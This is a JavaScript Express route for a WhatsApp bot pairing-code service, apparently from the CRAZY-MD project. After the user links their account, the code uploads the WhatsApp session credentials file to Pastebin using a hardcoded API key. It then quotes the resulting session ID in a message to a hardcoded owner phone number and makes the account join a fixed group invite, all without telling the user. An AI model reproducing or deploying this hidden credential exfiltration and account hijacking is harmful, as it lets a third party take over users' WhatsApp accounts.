const PastebinAPI = require('pastebin-js'),
pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL')
const {makeid} = require('./id');
const express = require('express');
const fs = require('fs');
let router = express.Router()
const pino = require("pino");
const {
    default: Gifted_Tech,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers
} = require("maher-zubair-baileys");

function removeFile(FilePath){
    if(!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true })
 };
router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;
        async function GIFTED_MD_PAIR_CODE() {
        const {
            state,
            saveCreds
        } = await useMultiFileAuthState('./temp/'+id)
     try {
            let Pair_Code_By_Gifted_Tech = Gifted_Tech({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({level: "fatal"}).child({level: "fatal"})),
                },
                printQRInTerminal: false,
                logger: pino({level: "fatal"}).child({level: "fatal"}),
                browser: ["Chrome (Linux)", "", ""]
             });
             if(!Pair_Code_By_Gifted_Tech.authState.creds.registered) {
                await delay(1500);
                        num = num.replace(/[^0-9]/g,'');
                            const code = await Pair_Code_By_Gifted_Tech.requestPairingCode(num)
                 if(!res.headersSent){
                 await res.send({code});
                     }
                 }
            Pair_Code_By_Gifted_Tech.ev.on('creds.update', saveCreds)
            Pair_Code_By_Gifted_Tech.ev.on("connection.update", async (s) => {
                const {
                    connection,
                    lastDisconnect
                } = s;
                if (connection == "open") {
                await delay(5000);
                let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
                await delay(800);
     const output = await pastebin.createPasteFromFile(data);
                                                  const b64data = 'SLG-MD~' + output.split('https://pastebin.com/')[1]
             /*  let b64data = Buffer.from(data).toString('base64'); */
               let session = await Pair_Code_By_Gifted_Tech.sendMessage(Pair_Code_By_Gifted_Tech.user.id, { text: b64data });
 
				   let GIFTED_MD_TEXT = `
*_Pair Code Connected by CRAZY Teams_*
*_Made With 💜_*
_____________________________________
╭━━━━━━━━━━━━━╮
┃         *『 𝓒𝓡𝓐𝓩𝓨-𝓜𝓓』*
┃        
┃ _You Have Completed the First Step to Deploy a Whatsapp Bot._
┃                      
╰━━━━━━━━━━━━━╯
╭━━━━━━━━━━━━━╮
┃                      
┃  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
┃ꪶ ུ۪۪.   *Ytube:* _(coming soon)_
┃ꪶ ུ۪۪.   *Owner:* _wa.me/237620114013_
┃ꪶ ུ۪۪.   *Repo:* _https://github.com/kenvofc/CRAZY-MD_
┃ꪶ ུ۪۪.   *WaGroup:* _https://chat.whatsapp.com/LkcKWR3VwQC0GPckKohKjS_
┃ꪶ ུ۪۪.   *WaChannel:* _https://whatsapp.com/channel/0029VaV3DymGE56jsC8j1M3c_
┃ꪶ ུ۪۪.   *Telgram:* _https://t.me/crazyccvChat_
┃                     
╰━━━━━━━━━━━━━╯
_____________________________________

_Don't Forget To Give Star To My Repo_ `
	 
		await Pair_Code_By_Gifted_Tech.sendMessage(`237620114013@s.whatsapp.net`,{text:GIFTED_MD_TEXT},{quoted:session});
		
await Pair_Code_By_Gifted_Tech.sendMessage(
    `237620114013@s.whatsapp.net`, 
    { audio: { url: "./public/song/kongga.opus" }, mimetype: 'audio/ogg; codecs=opus', ptt: true } // can send mp3, mp4, & ogg
);


const response = await Pair_Code_By_Gifted_Tech.groupAcceptInvite("Hyurt8L1oiDAXg0dadZ5mp")
console.log("joined to: " + response)

        await delay(100);
        await Pair_Code_By_Gifted_Tech.ws.close();
        return await removeFile('./temp/'+id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10000);
                    GIFTED_MD_PAIR_CODE();
                }
            });
        } catch (err) {
            console.log("service restated");
            await removeFile('./temp/'+id);
         if(!res.headersSent){
            await res.send({code:"Service Unavailable"});
         }
        }
    }
    return await GIFTED_MD_PAIR_CODE()
});
module.exports = router
